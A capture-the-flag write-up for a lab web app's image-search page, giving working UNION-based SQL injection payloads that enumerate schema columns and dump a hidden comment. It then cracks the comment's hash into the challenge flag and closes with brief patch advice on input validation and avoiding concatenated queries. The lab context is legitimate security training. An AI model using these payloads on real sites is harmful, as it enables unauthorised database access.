# B05-BlindSQLInjection-SearchImage

In this case we have to exploit this page:

>`http://192.168.56.106/index.php?page=searchimg`

In the previous exploit [b04-SQLInjection-members](/b04-SQLInjection-members) we also find,

![image](https://github.com/Seriots/Darkly/assets/94530285/fae66b82-bab0-4867-9426-6da39ffa1d86)

so let's try to start by it,

>`1 OR 1 UNION SELECT column_name,null FROM information_schema.columns WHERE table_schema=database()`

![image](https://github.com/Seriots/Darkly/assets/94530285/e194fc42-50e1-4ba4-804d-97ed9fa2f307)

We have 4 columns but one is interesting: `comment`

>`1 OR 1 UNION SELECT comment,null FROM list_images`

![image](https://github.com/Seriots/Darkly/assets/94530285/2e85d3e6-85fd-4c85-909c-b6855e9a4b8f)

So let's decrypt it:

>`1928e8083cf461a51303633093573c46 : albatroz`

To SHA256 to get the flag,

>`albatroz : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`


## PATCH

For patch this one we have to `improve` the `sanitization/validation` of input provide by an user,

to `block sql injection`.

`Stop` writing `dynamic queries` with string concatenation or

Prevent malicious SQL input from being included in executed queries.
